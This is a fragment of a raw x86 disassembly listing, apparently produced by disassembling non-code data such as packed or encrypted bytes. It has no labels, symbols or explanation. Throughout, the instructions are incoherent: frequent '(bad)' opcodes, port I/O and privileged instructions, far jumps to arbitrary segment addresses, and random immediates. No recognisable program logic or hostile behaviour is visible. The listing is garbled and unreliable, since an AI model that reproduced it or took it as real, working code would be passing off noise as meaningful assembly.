  413a4c:	ficom  DWORD PTR [edi+0x38517c51]
  413a52:	and    eax,0x77c35f61
  413a57:	and    dh,BYTE PTR [ebp-0x6d]
  413a5a:	mov    ah,0x37
  413a5c:	sahf   
  413a5d:	popf   
  413a5e:	enter  0x2a92,0x8a
  413a62:	cdq    
  413a63:	je     0x4139e8
  413a65:	stos   BYTE PTR es:[edi],al
  413a66:	or     BYTE PTR [edx+edi*2],0xa9
  413a6a:	or     eax,0xb0dfffad
  413a6f:	aaa    
  413a70:	fld    DWORD PTR [ebx-0x21]
  413a73:	and    esi,DWORD PTR [eax+ebx*8]
  413a76:	dec    esp
  413a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a78:	aaa    
  413a79:	sbb    bl,BYTE PTR [edx-0x4f349961]
  413a7f:	xor    eax,0x3a65733c
  413a84:	and    DWORD PTR [edi+0x6537f7c7],0xdfa486f7
  413a8e:	rol    BYTE PTR [eax],1
  413a90:	jmp    DWORD PTR [edx]
  413a92:	mov    ch,0xe0
  413a94:	je     0x413ae5
  413a96:	ja     0x413a75
  413a98:	jp     0x413a34
  413a9a:	jp     0x413a98
  413a9c:	scas   al,BYTE PTR es:[edi]
  413a9d:	cmc    
  413a9e:	fldenv [ebp+eax*4-0x4e]
  413aa2:	cwde   
  413aa3:	pop    esi
  413aa4:	cmp    ebx,ebx
  413aa6:	adc    dh,BYTE PTR [ebx-0x1cd1fecf]
  413aac:	test   eax,0x9bafb0ad
  413ab1:	dec    edi
  413ab2:	adc    cl,cl
  413ab4:	mov    dh,0x4
  413ab6:	xchg   BYTE PTR [edx],bh
  413ab8:	gs mov ebx,0x8fcd2bcb
  413abe:	lahf   
  413abf:	pop    ss
  413ac0:	mov    ds:0x30482e1,eax
  413ac5:	jl     0x413aeb
  413ac7:	(bad)  [edx+0x6b]
  413aca:	jmp    0x413b49
  413acc:	add    DWORD PTR ds:0x9c2cdee2,0x7c
  413ad3:	mov    edi,cs
  413ad5:	mov    edx,0xfc14b7ea
  413ada:	popf   
  413adb:	cmc    
  413adc:	push   eax
  413add:	mov    dh,0x2c
  413adf:	mov    esp,0xdc2d6b11
  413ae4:	cwde   
  413ae5:	inc    edx
  413ae6:	clc    
  413ae7:	(bad)  
  413ae8:	enter  0xbd22,0x4c
  413aec:	adc    eax,0x749386d3
  413af1:	mov    dl,BYTE PTR [edx-0x7a436461]
  413af7:	inc    edi
  413af8:	mov    ebp,0xd725d480
  413afd:	iret   
  413afe:	cwde   
  413aff:	(bad)  
  413b00:	es jecxz 0x413ac7
  413b03:	dec    eax
  413b04:	adc    ecx,DWORD PTR [ebx-0x3b]
  413b07:	and    eax,0x3a572dc9
  413b0c:	stos   DWORD PTR es:[edi],eax
  413b0d:	je     0x413b7f
  413b0f:	fwait
  413b10:	mov    eax,ds:0xac1e45e
  413b15:	arpl   WORD PTR [ecx],si
  413b17:	adc    BYTE PTR [esi+0x5996eca5],cl
  413b1d:	fwait
  413b1e:	aas    
  413b1f:	arpl   dx,si
  413b21:	or     eax,0x99d6d221
  413b26:	(bad)  
  413b27:	dec    eax
  413b28:	clc    
  413b29:	and    ah,BYTE PTR [eax]
  413b2b:	retf   0x560f
  413b2e:	xchg   ebp,eax
  413b2f:	into   
  413b30:	divps  xmm2,xmm4
  413b33:	push   edx
  413b34:	fwait
  413b35:	dec    edx
  413b36:	xor    DWORD PTR ds:0x1f9cd4bb,0x3f6ecf86
  413b40:	jecxz  0x413b40
  413b42:	(bad)  
  413b43:	addr16 push eax
  413b45:	xor    BYTE PTR [ecx+ebx*1+0x57364ae2],bl
  413b4c:	frstor [edx]
  413b4e:	pcmpgtb mm5,QWORD PTR [ecx+0x5c3a02c1]
  413b55:	(bad)  
  413b56:	ret    
  413b57:	mov    al,0x3e
  413b59:	mov    al,0x1f
  413b5b:	add    DWORD PTR [ebx-0x5f23a872],0x904f7751
  413b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b66:	xacquire xchg BYTE PTR [ebp-0x28444d9b],dh
  413b6d:	jp     0x413b8f
  413b6f:	das    
  413b70:	clc    
  413b71:	(bad)  
  413b73:	iret   
  413b74:	test   al,0x8c
  413b76:	jmp    0x20c3:0x8fd60ee9
  413b7d:	imul   esp,DWORD PTR fs:[ecx+0x5ba81503],0xee8b6ee2
  413b88:	sub    cl,cl
  413b8a:	loopne 0x413b1b
  413b8c:	pop    ebp
  413b8d:	js     0x413b97
  413b8f:	jo     0x413bfe
  413b91:	clc    
  413b92:	sahf   
  413b93:	xor    al,0xb5
  413b95:	push   0xffffffa7
  413b97:	fsubrp st(3),st
  413b99:	setne  BYTE PTR [ebx]
  413b9c:	cld    
  413b9d:	mov    ds:0x61ea038,al
  413ba2:	cmp    eax,0x485e2326
  413ba7:	fcmovnu st,st(5)
  413ba9:	lahf   
  413baa:	rcl    DWORD PTR [eax-0x275eecf5],0x7b
  413bb1:	add    ebp,DWORD PTR ds:[ebx-0x1f342c17]
  413bb8:	std    
  413bb9:	jecxz  0x413c36
  413bbb:	push   ebx
  413bbc:	xchg   esi,eax
  413bbd:	or     al,0x3
  413bbf:	inc    ecx
  413bc0:	mov    edi,0x8d161743
  413bc5:	mov    al,ds:0x45efc0c5
  413bca:	xchg   ebp,eax
  413bcb:	jae    0x413c2b
  413bcd:	dec    ebp
  413bce:	jb     0x413ba9
  413bd0:	jl     0x413bee
  413bd2:	jne    0x413bf5
  413bd4:	adc    eax,0x242d3c75
  413bd9:	sbb    esi,0xfffffff8
  413bdc:	retf   0x9a58
  413bdf:	add    cl,BYTE PTR [eax-0x41]
  413be2:	jae    0x413ba5
  413be4:	push   es
  413be5:	ror    BYTE PTR ds:0xc33153b5,0xfd
  413bec:	push   0x662642b6
  413bf1:	jge    0x413c2f
  413bf3:	cmp    BYTE PTR [ebx],ah
  413bf5:	repz call 0x8813add
  413bfb:	dec    ebp
  413bfc:	loop   0x413b9a
  413bfe:	retf   
  413bff:	(bad)  
  413c00:	cdq    
  413c01:	xchg   edi,eax
  413c02:	mul    DWORD PTR [ebx+0x6]
  413c05:	cli    
  413c06:	sub    esp,0x72
  413c09:	add    al,0x42
  413c0b:	mov    ch,0x2d
  413c0d:	and    ebx,DWORD PTR [ecx]
  413c0f:	sub    DWORD PTR [edx-0x3a],edx
  413c12:	ds shr ah,1
  413c15:	pmaxsw mm2,QWORD PTR [ecx]
  413c18:	retf   
  413c19:	mov    ah,0xc6
  413c1b:	ficom  DWORD PTR [edi+0x4caed1f5]
  413c21:	sbb    esi,edi
  413c23:	xor    eax,0xbaba1b34
  413c28:	aaa    
  413c29:	retf   
  413c2a:	sub    bh,ah
  413c2c:	mov    edx,0xb0e810cd
  413c31:	inc    eax
  413c32:	data16 adc BYTE PTR [ecx],0xc4
  413c36:	fsub   DWORD PTR [ecx+0x13]
  413c39:	enter  0x5b17,0x2a
  413c3d:	aad    0xab
  413c3f:	sub    eax,0x9081219
  413c44:	and    al,ah
  413c46:	dec    ebp
  413c47:	(bad)
  413c4b:	ins    DWORD PTR es:[edi],dx
  413c4c:	pushf  
  413c4d:	popa   
  413c4e:	sub    ebp,DWORD PTR [edx-0x1562ff39]
  413c54:	cli    
  413c55:	jae    0x413cac
  413c57:	dec    ebp
  413c58:	jo     0x413c49
  413c5a:	sbb    DWORD PTR [eax+0x2f],ecx
  413c5d:	mov    dl,0xd6
  413c5f:	jne    0x413cd9
  413c61:	retf   
  413c62:	or     DWORD PTR [esi*4-0x344b9028],esp
  413c69:	mov    ecx,0x9f1f8381
  413c6e:	rcl    DWORD PTR ds:0x654c7905,1
  413c74:	clc    
  413c75:	add    DWORD PTR [edi+0x5e126d88],esi
  413c7b:	xor    edi,eax
  413c7d:	jb     0x413cb2
  413c7f:	and    al,0x92
  413c81:	mov    al,0x5c
  413c83:	push   edx
  413c84:	into   
  413c85:	dec    edi
  413c86:	mov    ch,0xe3
  413c88:	jge    0x413c2d
  413c8a:	stc    
  413c8b:	fcomp  DWORD PTR [eax+0x658aceb3]
  413c91:	inc    esp
  413c92:	inc    edx
  413c93:	out    0x9c,al
  413c95:	inc    esi
  413c96:	sub    edi,DWORD PTR [edx]
  413c98:	aas    
  413c99:	(bad)  
  413c9a:	sbb    dl,al
  413c9c:	addr16 ss add ebx,0x12a924d2
  413ca4:	mov    edi,0x72d92cf2
  413ca9:	xor    al,0x35
  413cab:	pop    ss
  413cac:	icebp  
  413cad:	or     al,0x8d
  413caf:	dec    edx
  413cb0:	cmovs  ecx,DWORD PTR [edx+0x3657acae]
  413cb7:	ins    DWORD PTR es:[edi],dx
  413cb8:	inc    ebx
  413cb9:	scas   al,BYTE PTR es:[edi]
  413cba:	pop    ss
  413cbb:	sbb    eax,0xa4aa72c4
  413cc0:	add    cl,al
  413cc2:	dec    ebx
  413cc3:	jmp    0xf8b77851
  413cc8:	pop    es
  413cc9:	xor    al,0x78
  413ccc:	mov    al,0x5c
  413cce:	push   ds
  413ccf:	dec    edi
  413cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cd1:	loope  0x413cbd
  413cd3:	add    ebx,DWORD PTR ds:0xc5ff4a13
  413cd9:	xlat   BYTE PTR ds:[ebx]
  413cda:	mov    eax,ds:0x2d5bc19f
  413cdf:	gs data16 cli 
  413ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ce3:	shl    BYTE PTR [eax+0x5e53ac3a],0xec
  413cea:	mov    eax,ds:0x8f7e4512
  413cef:	add    al,BYTE PTR [edi]
  413cf1:	test   BYTE PTR [ebp+edx*1-0x72062843],dl
  413cf8:	test   BYTE PTR [ecx+ebp*2+0x2e7d7f58],0xd4
  413d00:	inc    ebx
  413d01:	outs   dx,BYTE PTR ds:[esi]
  413d02:	and    BYTE PTR [ebp-0x3d9ba5c1],dh
  413d08:	push   ds
  413d09:	dec    ebp
  413d0a:	mov    ss,WORD PTR [esi+0x55]
  413d0d:	jp     0x413cd3
  413d0f:	pop    esi
  413d10:	push   cs
  413d11:	popa   
  413d12:	outs   dx,DWORD PTR ds:[esi]
  413d13:	jmp    0x413ce1
  413d15:	xor    bl,BYTE PTR [edx-0x7f]
  413d18:	aad    0xb2
  413d1a:	push   es
  413d1b:	push   eax
  413d1c:	aad    0x47
  413d1e:	or     ecx,DWORD PTR [eax+0x6a]
  413d21:	add    ebp,ebp
  413d23:	clc    
  413d24:	cmp    edi,DWORD PTR [edi-0x7886e39a]
  413d2a:	mov    eax,0xadf4fd9b
  413d2f:	ins    DWORD PTR es:[edi],dx
  413d30:	mov    DWORD PTR [bx-0x37],ebp
  413d34:	push   esp
  413d35:	sbb    DWORD PTR [ecx+0x46],edi
  413d38:	test   BYTE PTR [esi+eiz*4+0x1ec8408c],0xe9
  413d40:	cdq    
  413d41:	in     al,dx
  413d42:	pop    ebp
  413d43:	clc    
  413d44:	jp     0x413d6d
  413d46:	jl     0x413cfe
  413d48:	out    0x27,eax
  413d4a:	inc    esp
  413d4b:	mov    edx,DWORD PTR [eax+0x1c3d0b13]
  413d51:	mov    edi,0x1f9c3524
  413d56:	das    
  413d57:	add    eax,0x9122a650
  413d5c:	scas   al,BYTE PTR es:[edi]
  413d5d:	push   0xffffffc1
  413d5f:	(bad)  
  413d60:	ja     0x413d31
  413d62:	mov    BYTE PTR [esi],0xb9
  413d65:	and    eax,0x93b01f4
  413d6a:	cld    
  413d6b:	mov    edi,0x78533b6e
  413d70:	lahf   
  413d71:	add    ebp,edi
  413d73:	aaa    
  413d74:	test   eax,0xd213070e
  413d79:	mov    esp,0xfcf0d6c5
  413d7e:	jbe    0x413d8a
  413d80:	(bad)  
  413d81:	arpl   WORD PTR [ecx],sp
  413d83:	xchg   edx,eax
  413d84:	pop    eax
  413d85:	aaa    
  413d86:	dec    ebp
  413d87:	repz fadd DWORD PTR [esi]
  413d8a:	xchg   ebx,eax
  413d8b:	leave  
  413d8c:	(bad)  
  413d8d:	pop    eax
  413d8e:	jmp    0x2e2e5542
  413d93:	inc    edi
  413d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d95:	adc    BYTE PTR [esi],cl
  413d97:	popf   
  413d98:	mov    bl,0x4
  413d9a:	xor    al,BYTE PTR [ebx+0x79ed364f]
  413da0:	lds    eax,FWORD PTR [ecx+0x49]
  413da3:	das    
  413da4:	xlat   BYTE PTR ds:[ebx]
  413da5:	js     0x413d62
  413da7:	retf   0x8981
  413daa:	adc    al,0x48
  413dac:	lods   al,BYTE PTR ds:[esi]
  413dad:	push   ss
  413dae:	in     eax,dx
  413daf:	mov    esi,edi
  413db1:	outs   dx,BYTE PTR ds:[esi]
  413db2:	xchg   BYTE PTR [eax],dl
  413db4:	push   ss
  413db5:	clc    
  413db6:	fiadd  WORD PTR [ecx+esi*8+0x2d]
  413dba:	inc    edx
  413dbb:	xor    eax,0xb2a7985f
  413dc0:	jnp    0x413d58
  413dc2:	shr    DWORD PTR [eax+edx*1],1
  413dc5:	loope  0x413dc3
  413dc7:	rcl    BYTE PTR [ecx+ebx*2+0x13114b06],cl
  413dce:	cmc    
  413dcf:	sub    al,0xad
  413dd1:	or     al,0x8b
  413dd3:	fdiv   QWORD PTR [edi-0x22]
  413dd6:	push   ebp
  413dd7:	ror    BYTE PTR [esi+0x4d],0xc4
  413ddb:	lock jg 0x413da2
  413dde:	sbb    eax,0xc7c271a6
  413de3:	imul   ebx,DWORD PTR [edx+0x2a],0x1b
  413de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413de8:	jmp    0xbe87:0xaff8952f
  413def:	into   
  413df0:	das    
  413df1:	fist   WORD PTR [esi]
  413df3:	jae    0x413e67
  413df5:	loopne 0x413dc5
  413df7:	xchg   edx,eax
  413df8:	lods   al,BYTE PTR ds:[esi]
  413df9:	xor    eax,DWORD PTR [edi+0x4]
  413dfc:	and    eax,0xb064e755
  413e01:	jmp    0x413e2f
  413e03:	and    al,0x8c
  413e05:	cmp    BYTE PTR [esp+ebx*8+0x1c93aec7],cl
  413e0c:	pop    ss
  413e0d:	shl    dh,1
  413e0f:	mov    cl,0x2
  413e11:	data16 xor BYTE PTR [ebx+0xbfe8304],ch
  413e18:	loopne 0x413e82
  413e1a:	jmp    0x413de7
  413e1c:	test   DWORD PTR [esi+0x18],esp
  413e1f:	outs   dx,DWORD PTR ds:[esi]
  413e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e21:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413e23:	loopne 0x413e31
  413e25:	in     al,dx
  413e26:	push   edx
  413e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e29:	jp     0x413e20
  413e2b:	mov    es,WORD PTR [eax+0xecb47c0]
  413e31:	mov    bh,0xcc
  413e33:	mov    ds:0x129db574,al
  413e38:	cmp    eax,0xc77865a2
  413e3d:	(bad)  
  413e3f:	call   0xc5770de4
  413e44:	lods   al,BYTE PTR ds:[esi]
  413e45:	ds fwait
  413e47:	jo     0x413e65
  413e49:	pop    edi
  413e4a:	gs push eax
  413e4c:	mov    edx,0x2458dc2f
  413e51:	leave  
  413e52:	mov    esi,0x975cdfca
  413e57:	lea    ecx,[eax]
  413e59:	xchg   esp,eax
  413e5a:	dec    esp
  413e5b:	popa   
  413e5c:	sar    bh,0x7c
  413e5f:	mov    bh,0xe0
  413e61:	jmp    0x6599:0xb447a6a9
  413e68:	jecxz  0x413e8b
  413e6a:	repnz outs dx,DWORD PTR ds:[esi]
  413e6c:	jne    0x413e36
  413e6e:	and    BYTE PTR [esp+eax*2+0x34bc2cc3],dh
  413e75:	fs mov edx,0xc408ede7
  413e7b:	out    dx,eax
  413e7c:	inc    ecx
  413e7d:	in     eax,0xca
  413e7f:	in     al,dx
  413e80:	add    DWORD PTR [eax],ecx
  413e82:	cmc    
  413e83:	push   esp
  413e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e85:	dec    ebp
  413e86:	test   DWORD PTR [ebp+esi*4+0x40],eax
  413e8a:	xchg   ebx,eax
  413e8b:	pop    esp
  413e8c:	ror    BYTE PTR [esi+eax*1],0x83
  413e90:	fs icebp 
  413e92:	(bad)  
  413e93:	lds    ebx,FWORD PTR [ecx+ecx*4]
  413e96:	add    BYTE PTR [ecx],cl
  413e98:	enter  0x7150,0xb7
  413e9c:	cld    
  413e9d:	and    ecx,esi
  413e9f:	fnstenv [edx+ecx*4+0x3026e8fc]
  413ea6:	and    DWORD PTR es:[edi-0x74],0xf
  413eab:	aas    
  413eac:	je     0x413ee9
  413eae:	inc    ebx
  413eaf:	add    ecx,eax
  413eb1:	not    BYTE PTR [ecx+0x7]
  413eb4:	test   eax,0xdf307e20
  413eb9:	ins    BYTE PTR es:[edi],dx
  413eba:	test   eax,0x52f01c9
  413ebf:	jno    0x413ea1
  413ec1:	sti    
  413ec2:	arpl   WORD PTR [edi],si
  413ec4:	scas   eax,DWORD PTR es:[edi]
  413ec5:	add    DWORD PTR [eax+0x59],esp
  413ec8:	cmc    
  413ec9:	or     dh,BYTE PTR [ecx]
  413ecb:	mov    ch,BYTE PTR [edi+0x2]
  413ece:	inc    ebp
  413ecf:	mov    ebx,0xdb5f04b4
  413ed4:	xor    al,0x93
  413ed6:	clc    
  413ed7:	push   0x63
  413ed9:	mov    al,ds:0x59be8f
  413ede:	fnsavew [eax-0x3825bae]
  413ee5:	test   eax,0x7cc854a5
  413eea:	inc    edi
  413eeb:	lahf   
  413eec:	and    ecx,DWORD PTR [eax-0x7ec0ffa3]
  413ef2:	jb     0x413f4b
  413ef4:	test   BYTE PTR [ecx+0x44],0xf0
  413ef8:	and    esp,DWORD PTR [ebx+0x3d]
  413efb:	shr    BYTE PTR [ecx-0x55],1
  413efe:	adc    esi,0x1eca2e5
  413f04:	lock ret 
  413f06:	push   ebx
  413f07:	cmc    
  413f08:	std    
  413f09:	ficom  DWORD PTR [edx+0x7131ee8e]
  413f0f:	mov    ds:0xfc45c9e3,eax
  413f14:	xchg   esp,eax
  413f15:	jg     0x413f17
  413f17:	js     0x413f17
  413f19:	outs   dx,DWORD PTR ss:[esi]
  413f1b:	daa    
  413f1c:	les    esi,FWORD PTR [edi+0xd]
  413f1f:	repnz sub al,0x71
  413f22:	xchg   ch,bh
  413f24:	inc    esi
  413f25:	dec    ebp
  413f26:	shl    dh,0x6c
  413f29:	aas    
  413f2a:	stos   DWORD PTR es:[edi],eax
  413f2b:	add    DWORD PTR [eax*4-0x45c392f0],ebx
  413f32:	pusha  
  413f33:	adc    al,ch
  413f35:	mov    eax,ds:0x1a9b6dc4
  413f3a:	xchg   ecx,eax
  413f3b:	ret    
  413f3c:	retf   
  413f3d:	je     0x413f96
  413f3f:	xor    eax,0xadd42478
  413f44:	shl    BYTE PTR [ebx+0x4c],0x52
  413f48:	pop    ebx
  413f49:	repnz mov edi,0x77f55f68
  413f4f:	shr    BYTE PTR [ebx],1
  413f51:	dec    ebx
  413f52:	pop    ebx
  413f53:	xor    esp,DWORD PTR [edi-0x63]
  413f56:	std    
  413f57:	test   al,0xe7
  413f59:	retf   
  413f5a:	arpl   WORD PTR [edx],ax
  413f5c:	sub    ecx,ecx
  413f5e:	push   DWORD PTR [ebx-0x75a057ea]
  413f64:	mov    edx,0x79a0d3c8
  413f69:	adc    BYTE PTR [eax-0x1e44f4a8],ah
  413f6f:	scas   eax,DWORD PTR es:[edi]
  413f70:	in     al,0x92
  413f72:	(bad)  [esi+0xc]
  413f75:	in     al,0x70
  413f77:	outs   dx,DWORD PTR ds:[esi]
  413f78:	xor    dl,BYTE PTR [edi-0x7ef23edb]
  413f7e:	xchg   BYTE PTR [eax-0x788f9f1e],dh
  413f84:	sahf   
  413f85:	xchg   BYTE PTR [edi],bl
  413f87:	loope  0x413f09
  413f89:	sbb    al,0x29
  413f8b:	popf   
  413f8c:	mov    WORD PTR [edi+0x52],ss
  413f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f90:	mov    al,0x92
  413f92:	cmp    cl,BYTE PTR ds:0x3bd1104d
  413f98:	retf   
  413f99:	mov    edx,edi
  413f9b:	add    BYTE PTR [esi+0xc],al
  413f9e:	adc    eax,0x9d09608e
  413fa3:	jecxz  0x413fd2
  413fa5:	outs   dx,DWORD PTR ds:[esi]
  413fa6:	ds dec ecx
  413fa8:	retf   
  413fa9:	popf   
  413faa:	cdq    
  413fab:	aam    0x15
  413fad:	mov    dl,0x29
  413faf:	jnp    0x413f32
  413fb1:	lahf   
  413fb2:	pop    edi
  413fb3:	cmp    bl,BYTE PTR [esi+0x76]
  413fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fb7:	loopne 0x413fc6
  413fb9:	cmc    
  413fba:	dec    esp
  413fbb:	sub    eax,0x73a99057
  413fc0:	jo     0x413f82
  413fc2:	xchg   edi,eax
  413fc3:	mov    ds:0xda4a8640,eax
  413fc8:	mov    al,ds:0x63394d99
  413fcd:	test   BYTE PTR [ecx],al
  413fcf:	int    0xf4
  413fd1:	push   edi
  413fd2:	xchg   edx,eax
  413fd3:	mov    BYTE PTR [edi+0x2a06a427],cl
  413fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fda:	call   0xe275:0xa30b52e9
  413fe1:	xchg   esi,eax
  413fe2:	cmc    
  413fe3:	sbb    ebx,esp
  413fe5:	push   eax
  413fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe7:	pop    es
  413fe8:	or     eax,DWORD PTR [ebx+0xa]
  413feb:	xchg   esp,eax
  413fec:	adc    DWORD PTR [ebp-0x1d60fe9d],ebp
  413ff2:	sar    DWORD PTR [ebx+0x742bad4d],0x95
  413ff9:	sbb    al,0x9f
  413ffb:	loope  0x413f87
  413ffd:	je     0x41406c
  413fff:	and    DWORD PTR [edx+0x723bae7c],ecx
  414005:	mov    bl,0x58
  414007:	jne    0x414082
  414009:	xor    bl,dl
  41400b:	and    al,0x20
  41400d:	mov    ah,0xe2
  41400f:	push   cs
  414010:	sahf   
  414011:	push   ss
  414012:	sub    dh,ah
  414014:	add    edx,edx
  414016:	scas   al,BYTE PTR es:[edi]
  414017:	jecxz  0x414085
  414019:	out    0x1e,eax
  41401b:	je     0x414055
  41401d:	xchg   esi,eax
  41401e:	jno    0x414042
  414020:	out    dx,al
  414021:	mov    ah,0x30
  414023:	mov    esi,0xd888b024
  414028:	pop    ebp
  414029:	in     eax,0xa2
  41402b:	repz bound edx,QWORD PTR [edi]
  41402e:	mov    DWORD PTR [ecx],ecx
  414030:	jle    0x414056
  414032:	xchg   dh,bl
  414034:	(bad)  
  414035:	aas    
  414036:	add    BYTE PTR [eax+0x11cd1983],bl
  41403c:	popf   
  41403d:	cmc    
  41403e:	jae    0x414040
  414040:	imul   edx,DWORD PTR [ebx],0x12973ba2
  414046:	stos   DWORD PTR es:[edi],eax
  414047:	sbb    BYTE PTR [eax+edx*2],ch
  41404a:	sub    BYTE PTR [esi+0x7b],ah
  41404d:	sub    ebx,DWORD PTR [ebp-0xb]
  414050:	push   0x6a3e085c
  414055:	test   BYTE PTR [ebp+0x6427a076],ah
  41405b:	sbb    al,0xc1
  41405d:	mov    ch,0x12
  41405f:	cmp    DWORD PTR [ebx-0x23645481],esi
  414065:	std    
  414066:	inc    ebp
  414067:	in     al,0xe5
  414069:	adc    DWORD PTR [ecx-0x6d56ea9b],ebx
  41406f:	sub    eax,0x12b28590
  414074:	pop    esp
  414075:	jmp    0x414098
  414077:	sub    ch,0xbc
  41407a:	(bad)  
  41407b:	push   cs
  41407c:	xor    eax,0xb630c5fe
  414081:	mov    ecx,0x2eba8d3b
  414086:	xchg   ebx,eax
  414087:	scas   eax,DWORD PTR es:[edi]
  414088:	mov    eax,ds:0x19170be0
  41408d:	push   esi
  41408e:	push   0x4b9ffd21
  414093:	sti    
  414094:	loope  0x41404e
  414096:	mov    edi,0xcb59a9a1
  41409b:	jae    0x4140cc
  41409d:	test   eax,edx
  41409f:	cmp    al,0xd6
  4140a1:	out    dx,al
  4140a2:	xor    dh,al
  4140a4:	inc    BYTE PTR ds:0xd2ee51f1
  4140aa:	popf   
  4140ab:	lds    ebp,FWORD PTR [edx-0x78]
  4140ae:	pop    edi
  4140af:	iret   
  4140b0:	adc    ecx,DWORD PTR [eax-0x7dcf10e2]
  4140b6:	sbb    DWORD PTR [esi-0x64cc58e5],0x4ccaac67
  4140c0:	xlat   BYTE PTR ds:[ebx]
  4140c1:	fst    QWORD PTR [ecx]
  4140c3:	jmp    0xe795435b
  4140c8:	xor    esp,0xffffffbf
  4140cb:	sub    BYTE PTR [ebx-0x7c1b1918],bl
  4140d1:	pushf  
  4140d2:	mov    ebx,0x57e535ae
  4140d7:	addr16 pop ecx
  4140d9:	sahf   
  4140da:	mov    edx,0x5a2a06b0
  4140df:	clc    
  4140e0:	gs sar ah,1
  4140e3:	in     eax,dx
  4140e4:	sbb    edi,0x159f5820
  4140ea:	and    bl,BYTE PTR [ecx-0xc35eadc]
  4140f0:	arpl   WORD PTR [edi-0x1662e802],bx
  4140f6:	xor    al,BYTE PTR [ecx]
  4140f8:	xor    dh,BYTE PTR [edi+eax*1]
  4140fb:	(bad)  
  4140fd:	mov    BYTE PTR [esi-0x2e],al
  414100:	xor    bl,ah
  414102:	add    al,0x8f
  414104:	add    bh,BYTE PTR [ecx]
  414106:	shl    BYTE PTR [eax-0x3f],0x9b
  41410a:	push   edx
  41410b:	mov    eax,ebp
  41410d:	aad    0xb5
  41410f:	inc    ebp
  414110:	inc    ebp
  414111:	xor    DWORD PTR [ebx-0x64],ebx
  414114:	cwde   
  414115:	into   
  414116:	cli    
  414117:	das    
  414118:	push   eax
  414119:	jb     0x414128
  41411b:	jmp    0x4140ca
  41411d:	cs popf 
  41411f:	jmp    0x6874:0x9a9df2ce
  414126:	push   ds
  414127:	nop
  414128:	jmp    0xaff:0xa76f089f
  41412f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414130:	inc    eax
  414131:	inc    ecx
  414132:	jle    0x414153
  414134:	js     0x41414b
  414136:	in     al,dx
  414137:	push   esp
  414138:	push   edx
  414139:	inc    edx
  41413a:	ja     0x414107
  41413c:	addr16 sbb al,dl
  41413f:	pop    ss
  414140:	loopne 0x41414d
  414142:	cmp    ebp,DWORD PTR fs:[ebx]
  414145:	retw   
  414147:	dec    ebp
  414148:	add    eax,DWORD PTR [eax+0xe]
  41414b:	push   edi
  41414c:	dec    ecx
  41414d:	dec    esp
  41414e:	dec    ecx
  41414f:	or     BYTE PTR [edx+0x671a555e],ah
  414155:	adc    eax,0xc7ac145
  41415a:	mov    bh,0xc
  41415c:	adc    eax,0x82d97ea6
  414161:	sti    
  414162:	jae    0x414182
  414164:	lods   al,BYTE PTR ds:[esi]
  414165:	dec    edi
  414166:	call   0x81ee:0x3f9e4c21
  41416d:	mov    ebp,0x40209722
  414172:	mov    al,0x13
  414174:	repz mov eax,ds:0x2f2f57af
  41417a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41417b:	xchg   ebx,eax
  41417c:	cwde   
  41417d:	adc    BYTE PTR [ebx+0x51],ah
  414180:	ins    DWORD PTR es:[edi],dx
  414181:	cmp    eax,0x4687b76
  414186:	jns    0x4141be
  414188:	push   ebx
  414189:	mov    al,ch
  41418b:	ror    DWORD PTR [esi+0x7b],0x45
  41418f:	fcomp  QWORD PTR [ebx+0xe]
  414192:	rol    ah,1
  414194:	sub    eax,0x80f157c4
  414199:	sahf   
  41419a:	(bad)  
  41419b:	xchg   esp,eax
  41419c:	gs add al,cl
  41419f:	loopne 0x41418a
  4141a1:	repnz popa 
  4141a3:	addr16 dec eax
  4141a5:	shl    DWORD PTR [eax-0x7c],1
  4141a8:	cwde   
  4141a9:	adc    eax,0x87c669bc
  4141ae:	mov    ah,0xf2
  4141b0:	dec    ecx
  4141b1:	adc    BYTE PTR [ebx+0x12d7c0d9],al
  4141b7:	cmp    eax,0x9b3b1868
  4141bc:	push   esp
  4141bd:	push   edi
  4141be:	xor    bl,BYTE PTR [edx-0x76e220cd]
  4141c4:	add    esi,eax
  4141c6:	(bad)  
  4141c7:	pop    edi
  4141c8:	mov    DWORD PTR [eax],edi
  4141ca:	ss sub ebp,ebp
  4141cd:	es mov bh,0xa8
  4141d0:	push   ebx
  4141d1:	sub    ch,BYTE PTR [ecx+0x70]
  4141d4:	and    eax,0x6b748294
  4141d9:	or     esp,ecx
  4141db:	sub    DWORD PTR [esi],0x97657a6
  4141e1:	jno    0x4141dd
  4141e3:	in     al,0x7d
  4141e5:	add    BYTE PTR [ecx+ebx*8+0x2ceecfad],ch
  4141ec:	push   edx
  4141ed:	sahf   
  4141ee:	jle    0x414214
  4141f0:	xchg   edx,eax
  4141f1:	pop    ecx
  4141f2:	inc    edx
  4141f3:	jmp    0xc8cb:0x2cd249d3
  4141fa:	mov    ebx,0xb5835a82
  4141ff:	jns    0x4141a3
  414201:	dec    edi
  414202:	int3   
  414203:	shl    BYTE PTR [edi-0x59],0x9d
  414207:	jnp    0x4141c9
  414209:	fist   WORD PTR [esi+0x27a83f99]
  41420f:	fild   WORD PTR [ecx]
  414211:	adc    DWORD PTR [edi+edi*4+0x40],ecx
  414215:	scas   eax,DWORD PTR es:[edi]
  414216:	and    al,0xed
  414218:	xor    ah,0xfd
  41421b:	push   esp
  41421c:	mov    ebx,0x6cbcf9cb
  414221:	lods   eax,DWORD PTR ds:[esi]
  414222:	pop    ebp
  414223:	pop    ss
  414224:	sub    esp,DWORD PTR [eax-0x7838a8f0]
  41422a:	sub    BYTE PTR [edi-0x69],ch
  41422d:	not    BYTE PTR [esi+eiz*2+0x15996cfd]
  414234:	dec    ebp
  414235:	pop    esp
